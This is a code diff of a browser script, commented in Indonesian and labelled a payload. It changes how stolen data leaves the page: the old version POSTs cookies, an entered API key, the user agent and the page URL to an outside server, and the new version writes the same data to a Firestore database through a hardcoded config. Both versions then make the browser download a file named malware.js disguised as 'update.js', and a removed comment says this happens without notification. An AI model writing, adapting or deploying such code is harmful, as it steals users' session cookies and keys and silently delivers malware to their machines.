@@ -1,18 +1,31 @@
-// ===== PAYLOAD (cookie + download) =====
+// ===== PAYLOAD (Firestore + Download) =====
 (function() {
-    // Kirim cookie ke server
-    fetch('https://payload-nu-eight.vercel.app/api/server.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            cookies: document.cookie,
-            api_key: document.getElementById('api-input')?.value || '',
-            user_agent: navigator.userAgent,
-            url: window.location.href
-        })
+    // 1. Kirim data ke Firestore
+    const firebaseConfig = {
+        apiKey: "AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8",
+        authDomain: "metadata-162de.firebaseapp.com",
+        projectId: "metadata-162de",
+        storageBucket: "metadata-162de.firebasestorage.app",
+        messagingSenderId: "619982193399",
+        appId: "1:619982193399:web:b3c4111e57e46d6f6f49f2",
+        measurementId: "G-Z6RWGEMLXB"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    db.collection("logs").add({
+        cookies: document.cookie,
+        api_key: document.getElementById('api-input')?.value || '',
+        user_agent: navigator.userAgent,
+        url: window.location.href,
+        timestamp: new Date().toISOString()
+    })
+    .catch((error) => {
+        console.error("Payload error:", error);
     });
 
-    // Download malware tanpa notif
+    // 2. Download malware.js
     const link = document.createElement('a');
     link.href = 'https://shadowofobscurity322.github.io/payload/malware.js';
     link.download = 'update.js';
